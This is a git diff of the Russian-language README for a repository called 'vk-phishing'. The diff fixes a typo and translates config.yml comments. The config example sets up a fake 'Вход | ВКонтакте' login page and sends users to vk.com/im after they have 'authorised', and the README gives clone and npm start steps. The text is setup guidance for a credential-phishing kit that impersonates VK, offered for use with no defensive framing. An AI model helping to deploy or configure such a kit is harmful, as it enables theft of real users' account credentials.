@@ -17,7 +17,7 @@ git clone https://github.com/xxhax-team/vk-phishing.git
 
 Или просто скачайте этот репозиторий
 
-![Гай по скачиванию](how-to-clone.png)
+![Гайд по скачиванию](how-to-clone.png)
 
 
 3. Распакуйте его в папку
@@ -57,9 +57,9 @@ npm start
 Все настройки делаются в файле `config.yml`, если вы знаете английский, всё поймёте, а если нет, то вот перевод
 
 ```YAML
-title: Вход | ВКонтакте # Title of page, that will be visible to user
-image: /icon.png # Same as title
-exit: https://vk.com/im # User will go to this page after successful auth
+title: Вход | ВКонтакте # Заголовок странички, нужен для превью в соц-сетях
+image: /icon.png # То-же самое что и Заголовок
+exit: https://vk.com/im # URL куда перенаправит успешно авторизованного пользователя
 port: 3000 # Порт на котором будет работать сервер
 
 plugins: # Список плагинов и их настроек
